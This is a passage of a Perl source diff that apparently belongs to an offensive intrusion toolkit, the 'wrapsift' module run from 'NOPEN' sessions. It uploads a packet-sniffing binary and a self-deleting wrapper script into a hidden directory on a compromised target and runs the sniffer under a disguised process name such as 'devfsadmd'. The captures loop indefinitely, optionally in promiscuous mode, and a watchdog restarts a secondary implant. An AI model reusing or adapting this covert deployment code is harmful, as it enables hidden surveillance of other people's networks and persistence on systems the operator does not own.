+	      unless ($shelloutput =~ m,^-r.x.*/$remotecmd,);
+      }
+      newhostvar(host_wrapsiftbinsconfirmed," (at ".gmtime().")");
+  } else {
+      $previously = " previously";
+  }
+
+    progprint("$COLOR_FAILURE\n\n$prog has$previously confirmed$host_wrapsiftbinsconfirmed\n".
+	      "that these required remote executables are in our PATH:\n$COLOR_NORMAL\n".
+	      "          ".join("\n          ",@checkbins));
+  if ($sift_watchfor) {
+      mydie("-R $opt_R strings cannot contain whitespace--you may use a dot instead\n".
+	    "and the greps will match a space.")
+	  if ($sift_watchfor =~ /\s/);
+      $sift_watchfor =~ s,^[\.\/]+,,g;
+      ($sift_watchfor,$sift_watchforchildren) =
+	  $sift_watchfor =~ /([^,]+)(.*)/;
+      if ($sift_watchforchildren) {
+	  $sift_watchforchildren =~ s/^,+//;
+	  $sift_watchforchildren =~ s/,/ /g;
+      }
+      my ($alreadythere) = doit("=ps | grep -v grep | grep \"$sift_watchfor\"");
+      if ($alreadythere) {
+	  offerabort($COLOR_FAILURE."\n\n".
+		     "==\n$alreadythere==\n".
+		     "   WARNING       WARNING       WARNING       WARNING $COLOR_NORMAL\n\n".
+		     "A process called $sift_watchfor is already running.  If that is the one\n".
+		     "wrapsift is supposed to be looking for, that's fine.  If it is not, then\n".
+		     "a new name not already visible on the target has to be chosen (and so you\n".
+		     "must also rename ./$sift_watchfor).","ABORT");
+      }
+      ($alreadythere) = doit("-ls $sift_deploydir/$sift_watchfor");
+      my ($VER,$TOOLNAME,$moreprompt) = ();
+      if ($alreadythere) {
+	doit("-lcd $opup",
+	     "-get -l $sift_deploydir/$sift_watchfor",
+	     "-lcd $opdown");
+      } else {
+	offerabort($COLOR_FAILURE."\n\n".
+		   "   WARNING       WARNING       WARNING       WARNING $COLOR_NORMAL\n\n".
+		   "With the -R option, wrapsift is responsible for starting ./$sift_watchfor\n".
+		   "if it exists--but it does not. That is fine, it simply disables this\n".
+		   " but$COLOR_FAILURE BE AWARE${COLOR_NORMAL}: The script WILL START anything called\n".
+		   "$sift_deploydir/$sift_watchfor if it appears later.\n\n");
+	if (-f "$opup/$sift_watchfor") {
+	  my ($ans) = mygetinput(`/bin/ls -al $opup/$sift_watchfor`."\n\n".
+				 "Is this the correct file to log the secondary tool WRAPSIFT\n".
+				 "is deploying?","Y");
+	  if ($ans eq "n") {
+	    rename("$opup/$sift_watchfor","$opup/$sift_watchfor.OLD");
+	    progprint(".\n\n\nOK, you will have to put that in place, we've moved that aside:\n\n".
+		      `/bin/ls -al $opup/$sift_watchfor`);
+	    sleep 3;
+	  }
+	}
+	while (! -f "$opup/$sift_watchfor") {
+	  offerabort($COLOR_FAILURE."\n\n".
+		     "Until $opup/$sift_watchfor exists, we cannot proceed.\n$COLOR_NORMAL\n".
+		     "Please put it in place");
+	}
+      }
+      if (`grep -l CAPFILEPREFIX= $opup/$sift_watchfor`) {
+	$TOOLNAME = "COTTONSCYTHE";
+      }
+      my (@TOOLCONTENT) = readfile("ARRAY","$opup/$sift_watchfor");
+      my (@DATESTR) = grep /(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d+).*\d+:\d\d:\d+.*\s\d\d\d\d/,@TOOLCONTENT;
+      if (@DATESTR == 1) {
+	$DATESTR[0] =~  /(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d+).*\d+:\d\d:\d+.*\s(\d\d\d\d)/i;
+	$VER= sprintf "%4d.%02d.%02d" , $3 , 1+$nummon{ucfirst $1} , $2 ;
+      }
+      $moreprompt = " (it appears to be $TOOLNAME)"
+	if $TOOLNAME;
+      (undef,$TOOLNAME) = mygetinput("What is the tool name being started by \n".
+				     "WRAPSIFT as $sift_watchfor$moreprompt?",$TOOLNAME);
+      (undef,$VER) = mygetinput("Is this the right version string?",$VER) if $VER;
+      my ($content,$warning) = logtool
+	(
+	 "$TOOLNAME",
+	 "$VER",
+	 "SUCCESSFUL",
+	 "DEPLOYED",
+	 "by WRAPSIFT ($sift_runas), running as $sift-watchfor, via -gs wrapsift $origargs",
+	 undef,
+	 "$opup/$sift_watchfor",
+	);
+  }
+} #myinit
+
+sub buildwrapsift {
+  # This script will modify the math from | bc to $(( syntax if
+  # -A option is used.
+   #Run after all vars in here are defined
+    # We remove any double quotes put there on command line
+    $sift_filter = $1 if ($sift_filter =~ m,^\"(.*[^\\])\"$,);
+  $sift_scriptconfig = "#!$targetshell
+DIR=$sift_deploydir
+BDIR=$sift_bindir
+DEST1=$sift_currentdir
+DEST2=$sift_donedir
+DBGDIR=$sift_debugdir
+SELFDELETE=$sift_unlink
+COMPRESS=$sift_compress
+TOOL=$sift_runas
+MAXPCT=$sift_maxpct
+WIPEONMAX=$sift_wipeonmax
+WIPEUNDER=$sift_wipeunder
+RETRYONDIE=$sift_retryondie
+MAXFILES=$maxfiles
+OUTFILE=$sift_outfile
+CONF=$sift_currentdir/$sift_config
+DIEDIR=$sift_diedir
+V=$rmverbose
+CAP=$sift_maxmeg
+SPLIT=$sift_chopsize
+INTF=$sift_intf
+PSCMD=\"$pscmd\"
+SCRIPTNAME=$sift_runscriptas
+RUNFOR=$sift_runfor
+SLEEPFOR=$sift_sleepfor
+WATCHFOR=$sift_watchfor
+WATCHFORCHILDREN=\"$sift_watchforchildren\"
+DELAYFOR=$sift_delayfor
+INODEDF=\"$inodedf\"
+KBDF=\"$kbdf\"
+FILT=\"$sift_filter\"
+MOREARGS=\"$sift_moreargs\"
+";
+
+  unless ($checkdebugonly or $lookforsift) {
+    mydie("Cannot open $opup/wrapsift.sh")
+      unless open(SIFTIN,"$opup/wrapsift.sh");
+    $sift_scriptcontent = "";
+    while(<SIFTIN>) {
+      next unless m,^\# END ARGS,;
+      $sift_scriptcontent = $_;
+      last;
+    }
+    while(<SIFTIN>) {
+      if (!$usebcmath and /\| *bc/) {
+	# Using dot here for backticks, just easier
+	my ($varname,$math) = 
+	  /^(.*)=.echo (.*)\s*\|\s*bc.\s*$/;
+	$math =~ s,\$(.*),\$\(\($1\)\),;
+	$math =~ s,\s+,,g;
+	$_ = "$varname=$math\n";
+      }
+      s/die (\d+).*/die $1/g unless $debug;
+      $sift_scriptcontent .= $_;
+    }
+    close(SIFTIN);
+    mydie("ERROR: Read in $opup/wrapsift.sh, but it is empty")
+      unless ($sift_scriptcontent and $sift_scriptconfig);
+    
+    preservefile("$opup/wrapsift.sh.LATEST");
+    preservefile("$opup/wrapsift.sh.LATEST.config");
+    mydie("Cannot open $opup/wrapsift.sh.LATEST for writing")
+      unless open(SIFTOUT,"> $opup/wrapsift.sh.LATEST");
+    mydie("Cannot open $opup/wrapsift.sh.LATEST.config for writing")
+      unless open(SIFTCFG,"> $opup/wrapsift.sh.LATEST.config");
+    print SIFTOUT $sift_scriptconfig;
+    print SIFTOUT $sift_scriptcontent;
+    print SIFTCFG $sift_scriptconfig;
+    
+    close(SIFTOUT);
+    close(SIFTCFG);
+  }
+}# Buildwrapsift
+
+sub myprep {
+  checkmkdir($sift_donedir,$sift_currentdir,$sift_deploydir,$sift_bindir,);
+  my @localsifts = picksift();
+  checkremotesift(@localsifts);
+
+  unless ($inodedf and $kbdf) {
+      my @nopenlines = ();
+      ($output,$nopenlines,@output) = doit("=df");
+      push(@nopenlines,grep /^\[df/ , split(/\n/,$nopenlines));
+      $nopenlines[-1] =~ s,^\[df,=df = df,;
+      ($output,$nopenlines,@output) = doit("=di");
+      push(@nopenlines,grep /^\[df/ , split(/\n/,$nopenlines));
+      $nopenlines[-1] =~ s,^\[df,=di = df,;
+# -help in doit broke with NOPEN 3.2, running the alias and parsing nopenlines replaces that
+#    ($output,$nopenlines,@output) = doit("-help > L:/current/tmp/.sifthelp.$$");
+ 
+#    while (my $line = shift(@nopenlines)) {
+
+    foreach my $line (@nopenlines) {
+	$line =~ s,\],,g;
+	$line =~ /(=d.) = (df -\S*)\s*$/;
+	next unless $line =~ /(=d.) = (df -\S*)\s*$/;
+	my ($name,$value) = ($1,$2);
+	
+	newhostvar(inodedf,$value) if ($name eq "=di") ;
+	newhostvar(kbdf,$value) if ($name eq "=df") ;
+    }
+
+dbg("Got localsifts=(@localsifts);
+localsifts[0]=$localsifts[0]=
+nopenlines=(\n".join("\n",@nopenlines)."\n)
+inodedf=$inodedf=
+kbdf=$kbdf=
+");
+  }
+
+  buildwrapsift();
+}
+
+sub picksift {
+  mydie("Cannot opendir $opup") unless opendir(SIFTDIR,$opup);
+  my @localsifts = grep /sift/i,sort readdir SIFTDIR;
+  closedir(SIFTDIR);
+  if (opendir(SIFTDIR,"$opup/sift")) {
+    foreach my $sift (grep /sift/i,sort readdir SIFTDIR) {
+      push(@localsifts,"sift/$sift");
+    }
+    closedir(SIFTDIR);
+  } else {
+    dbg("Cannot opendir $opup/sift");
+  }
+  @localsifts = grep ! /^(\.\.*)$/ , @localsifts;
+  @localsifts = grep ! /(wrapsift|tar.bz2)/ , @localsifts;
+  @localsifts = grep ! /\/(\.\.*)$/ , @localsifts;
+  @localsifts = grep /solaris/i,  @localsifts if $solaristarget;
+  @localsifts = grep !/solaris/i,  @localsifts unless $solaristarget;
+  @localsifts = grep /sparc/i,  @localsifts if $sparctarget;
+  @localsifts = grep /linux/i , @localsifts if $linuxtarget;
+  @localsifts = grep /64/,  @localsifts if (($intel64target or $sparc64target) and
+					     grep /64/,@localsifts);
+  return @localsifts;
+}
+
+sub checkremotesift {
+  local(@localsifts) = (@_);
+  my ($justputthere,$alreadythere) = (0,0);
+  while (1) {
+    my ($output,$nopenlines,@psoutput) = doit("-ls -d $sift_deploydir/$sift_runas");
+    if ($output) {
+      $alreadythere = 1;
+      last if $justputthere;
+      my $localsize = -s $localsifts[0];
+      my ($type,$inodes,$user,$group,$remotesize,$monstr,
+	  $mday,$hm,$y,$filename,@morefilename)
+	= split (/\s+/,$output);
+      my $sizemore = "";# (which matches $opup/$localsifts[0] in size)\n";
+      $sizemore = " (which$COLOR_FAILURE DOES NOT MATCH$COLOR_NORMAL $opup/$localsifts[0] in size)\n"
+	unless ($localsize != $remotesize);
+      if (-f "$opup/$localsifts[0]") {
+	my $listing = `cd $opup ; ls -alrtL @localsifts 2>/dev/null`;
+	my $moresize = "";
+	$moresize = " (${COLOR_FAILURE}red$COLOR_NOTE one matches remote one's size)"
+	  unless $sizemore;
+	$listing =~ s,([^\n]* $remotesize [^\n]*),$COLOR_FAILURE$1$COLOR_NORMAL,;
+	$sizemore .= 
+	  "Local sift(s) matching target$moresize $sift_runas:$COLOR_NORMAL\n\n".
+	  "cd $opup ; ls -alrtL @localsifts 2>/dev/null\n".
+	  $listing.
+	  "\n\n";
+	($sift_binary) = $listing =~ m, (sift/\S+),;
+      } elsif (!@localsifts) {
+	$sizemore = "NO LOCAL SIFTS FOUND MATCHING TARGET\n\n";
+      }
+      my ($ans) = mygetinput
+	(
+	 "$COLOR_NOTE\n".
+	 "Remote $sift_runas:$COLOR_NORMAL\n\n".
+	 $output."\n\n$COLOR_NOTE".
+	 $sizemore.
+	 "Looks like sift is already there as $sift_runas.\n\n".
+	 "Do you want to use the file already there?","Y","A");
+      mydie("User aborted")
+	if ($ans eq "a");
+      if ($ans ne "y") {
+	doit("-rm $sift_deploydir/$sift_runas");
+	($justputthere,$alreadythere) = (0,0);
+      }
+    }
+    last if $alreadythere;
+    my $list = "";
+    foreach (@localsifts) {
+      $list .=  `ls -alrtL $opup/$_ | sed "s,.*root,   ,g"`;
+    }
+    $list = "Matching local sift binaries:\n$COLOR_NOTE\n$list\n$COLOR_NORMAL"
+      if $list;
+    my $default = "$opup/$localsifts[-1]" if $localsifts[-1];
+    my ($ans,$longans) = mygetinput
+      ($list."\n\n".
+       "What local sift binary would you like to upload as\n".
+       "   $sift_deploydir/$sift_runas (Or you can ABORT)?\n\n",
+       $default
+      );
+    mydie("User aborted") if ($longans =~ /^a/i);
+    if (-e $longans) {
+      $sift_binary = $longans;
+      doit("-put $longans $sift_deploydir/$sift_runas");
+      $justputthere++;
+    }
+  }
+}
+
+sub checkmkdir {
+  local (@dirs) = uniqify_array(@_);
+
+  my %checkedalready = ();
+  foreach my $dir (@dirs) {
+    my $prompt = "to build our work area in the hidden directory";
+    $prompt = "our debug directory, where .dbg will grow"
+      if $dir eq $sift_debugdir;
+    next if $checkedalready{$dir};
+    my ($output,$nopenlines,@psoutput) = doit("-ls -d $dir");
+    if ($output) {
+      my $subdir = $dir;
+      while (length $subdir >= length($host_hiddendir)) {
+	$checkedalready{$subdir}++;
+dbg("just set 	\$checkedalready{$subdir}=$checkedalready{$subdir}=");
+	$subdir = dirname($subdir);
+      }
+      next;
+    }
+    if ((!$sift_deploydirexists) and ($dir =~ m,$sift_deploydir,)) {
+	my ($alreadyexists) = doit("-ls -d $sift_deploydir");
+	mydie("Unable to continue:\n\n\n".
+	      "   -d $sift_deploydir does not yet exist")
+	    unless ($alreadyexists);
+	$sift_deploydirexists++;
+    }
+    offerabort("To proceed, $prog needs to run:  mkdir -p $dir\n".
+	       "($prompt)");
+     ($output,$nopenlines,@psoutput) = doit("mkdir -p $dir");
+    dbg("Just made dir=$dir= got   ($output,$nopenlines,@psoutput) ");
+    # We re-test same dir again after making it
+    redo;
+  }
+}
+
+sub mydoit {
+  local (@what) = (@_);
+  my ($o,$n,@o) = doit(@_);
+  $completeoutput .= $o;
+  push (@completeoutput,@o);
+  return ($o,$n,@o);
+}
+
+
+sub setusagetexts {
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=wrapsift\" is used.
+
+";
+  $gsusagetext="
+Usage:
+
+$prog \[OPTIONS\] [PCAP_FILTER | -j PCAP_FILE]
+
+$prog deploys a bourne shell wrapper script along with the sift binary.
+Both are deployed to the target hidden directory by default.
+
+The $opup/wrapsift.sh file is modified per the $prog options used,
+then it and the sift binary are uploaded and the script is executed.
+
+The script shows some output indicating its initial progress, daemonizes, and
+then execution is returned to the NOPEN window. The script will run until
+killed. It loops infinitely, starting up a fresh instance of sift as
+configured every -I seconds. The loop starts sift, lets it finish, then moves
+the capture file just obtained from the -s sdir to the capture directory
+(-S Sdir, and defaulting to ./s/s within the hidden directory). The capture
+files in -S Sdir to be retrieved later start with the prefix determined by
+the -o str option and end in a YYYYMMDDHHMMSS (UTC) timestamp.
+
+Multiple $prog instances can be used to start concurrent sift instances
+if care is used. Best is to use a different -o string for each and the same
+capture directory (-S Sdir). Be sure to use a different filename prefix
+(-o str) for each instance. The config file for each will then use the same
+string, so using -B with the correct -o str will only modify one instance.
+
+DEBUGGING:
+
+The currently running wrapsift.sh script(s) can be monitored by creating the
+debug directory (-D DDir). Using the -T option with the same settings as when
+deployed will offer to create it for you. When the DDir exists, debug entries
+from scripts configured with that debug location (normally all use the
+default one) will append debug output to a file there called .dbg.
+
+If a script instance deployed by $prog dies while the DDir does not exist,
+then in sdir, the file starting with .D (ending with the -o str) is written to
+(appended). The new line will be in the following format, which includes the
+interface and filter as well as the error code indicating where it died (look
+in $opup/wrapsift.sh for the comment associated with that error, search for
+\"die ERR\" for that ERR number):
+
+        GMT-DATE: (INTF:FILT)[pid] ERR
+
+
+OPTIONS
+ -h/-v           Show this help/version
+".
+#NOT THERE: -A ARGS         Additional sift arguments (NOT FILTERS)
+" -A              Use backticked bc for arithmetic in lieue of \$((VAR syntax.
+                 If you see an error related to variable MINCOUNT=\$ with the
+                 default, then try -A.
+ -b bdir         Directory to upload/execute the shell script, defaults to
+                 /tmp unless -u is used, then defaults to the hidden dir
+ -B              Build a new config file for upload with new settings
+                 (for a script already deployed and running)
+ -c SIZE         Chop each -M MAX sized collect file using split into chunks
+                 each of this SIZE (in megabytes). Using -c value >= -M value
+                 disables splitting and allows arbitrarily large pcap files.
+                 Use with CAUTION.
+ -C TOOL         Compress with remote TOOL after moving each capture file
+ -d ddir         Deployment directory                [defaults to hidden dir]
+ -D Ddir         Directory in which debug log .dbg will be updated   [ddir/d]
+                 when Ddir exists. DO NOT LEAVE THIS THERE UNATTENDED
+ -E shell        Use this remote shell (CONFIRM THIS WORKS)       [$def_E]
+       NOTE:     Will automatically try /bin/sh if $def_E is not there.
+ -f MAX          Allow at most MAX files in -S Sdir. Script             [$def_f]
+                 will delete the oldest if this cap is exceeded
+ -G BYTES        As sift exits, the script will delete any collection files
+                 less than BYTES in size. Use -G 25 and zero packet pcap files
+                 (which are 24 bytes) will be deleted automatically.
+ -i intf         Interface for sift to capture on                  (required)
+ -I TIME         Duration to deploy each sift instance                   [$defIstr]
+ -j locfile      Local file which contains the PCAP filter. Allows very
+                 long filters, too long for NOPEN command lines.
+ -l              Look for previous deployments (with =ps
+ -L              Deploy sift in promiscuous mode (MIGHT LOG, esp. ON LINUX)
+ -M MAX          Have each instance of sift stop after MAX megabytes     [10]
+ -N              Deploy sift in Netglean selective capture mode.
+ -o str          Filename prefix in Sdir to call the files         (required)
+ -p TIME         Duration to sleep each loop if file system too full    [$defpstr]
+ -P MAXPCT       Stop writing sift output files when the file      (required)
+                 system is MAXPCT% full
+ 
+ -Q TIME         Time to sit idle between sift runs                      [$defQstr]
+ -r runas        Name to run sift as                              [devfsadmd]
+ -R P[,K1[,K2]]  Monitor =ps output every loop for a process running ./P that
+                 optionally has a descendent K1 (or optionally K2).  If P is
+                 not running, start ./P. If P is running, and if one or more
+                 Kn processes are provided but no such descendent Kn is found,
+                 look again for TEN SECONDS, and if still no such descendent
+                 is visible, KILL the running process P, then start ./P again.
+           NOTE: ANY of the Kn processes running is sufficient to leave ./P
+                 as it stands (no restart). 
+ -s sdir         Directory for current sift capture file             [ddir/s]
+ -S Sdir         Directory for completed/moved capture files       [ddir/s/s]
+ -T [#]          Tail # lines of the log file (.dbg) in Ddir and exit    [20]
+ -u              Do NOT have the script self-delete and        [default does]
+                 allow script to start even if capture file exists
+ -X shellas      Run shell wrapper script as                           [O.sh]
+ -w              When the -P cap is reached, delete enough files in ddir/s/s
+                 to bring us under the -P cap. If that is not possible, we
+                 still sleep.
+ -W              If sift fails to start (e.g., the interface is down), the norm
+                 is to sleep for the -p TIME setting and try again. This option
+                 reverts to the OLD default of dying, instead.
+ -z SNAPLEN      Uses the -S SNAPLEN option to SIFT to capture only the first
+                 SNAPLEN bytes in each packet. SNAPLEN of 0 is not needed
+                 to capture entire packet, that is SIFTs default.
+                       
+
+                 (    TIME formats for -I/-p/-Q/-W: [#h][#m]#[s]    )
+
+NOTE: The \"O\" used in -c and -X defaults will be the value of the required
+      -o option used.
+
+$prog \[OPTIONS\] \[PCAP_FILTER | -j PCAP_FILE\]
+
+";
+  my $notusedanymore = "
+
+  -C file     Filename in sdir to read variables from if it exists   [s.c]
+
+";
+}#setusagetexts
